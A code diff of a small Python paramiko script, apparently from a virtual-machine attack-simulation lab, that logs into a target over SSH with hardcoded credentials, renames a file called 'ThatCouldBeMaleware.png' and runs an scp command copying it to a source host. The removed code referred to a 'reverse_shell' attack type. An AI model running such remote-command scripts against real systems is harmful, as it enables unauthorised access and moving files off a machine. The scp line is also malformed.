@@ -1,19 +1,13 @@
 import paramiko
 
-def connect_to_target(target_ip, attack_type):
+def connect_to_target(target_ip, source_ip):
     port = 2222                  
-    username = "tempuser" #geendert zu vm user
-    password = "TempPassword123!" #geendert zu vmuser
+    username = "vboxuser" #geändert zu vm user
+    password = "Attacke" #geändert zu vmuser
 
-    if attack_type == "reverse_shell":
-        # bei verzeichnessen / or \ ???
-        attack = "mv ~/daisy/src/daisy/communication/ThatCouldBeMaleware.png ~/daisy/src/daisy/communication/YouWereAttacked.png"
-    
-    elif attack_type == "path":
-        attack = "cd /.."
-    
-    else:
-        raise ValueError
+    rename= "mv ~/daisy/src/daisy/communication/ThatCouldBeMaleware.png ~/daisy/src/daisy/communication/YouWereAttacked.png"
+    #scp datei.txt benutzer@anderer-server:/ziel/pfad/
+    copy = "scp -P 2222 ~/daisy/src/daisy/communication/YouWereAttacked.png vboxunser:"+source_ip+"~/daisy/src/daisy/communication/YouWereAttacked.png"
 
     # SSH-Client 
     client = paramiko.SSHClient()
@@ -23,7 +17,8 @@ def connect_to_target(target_ip, attack_type):
         client.connect(target_ip, port=port, username=username, password=password)
 
         # Beispiel: Befehl ausführen
-        stdin, stdout, stderr = client.exec_command(attack)
+        stdin, stdout, stderr = client.exec_command(rename)
+        stdin, stdout, stderr = client.exec_command(copy)
 
         print("stdout:",stdout.read().decode())
         print("stderr:",stderr.read().decode())
@@ -34,5 +29,3 @@ def connect_to_target(target_ip, attack_type):
         client.close()
         print("Connection closed.")
 
-if __name__ =="__main__":
-    connect_to_target("127.0.0.1", "reverse_shell")
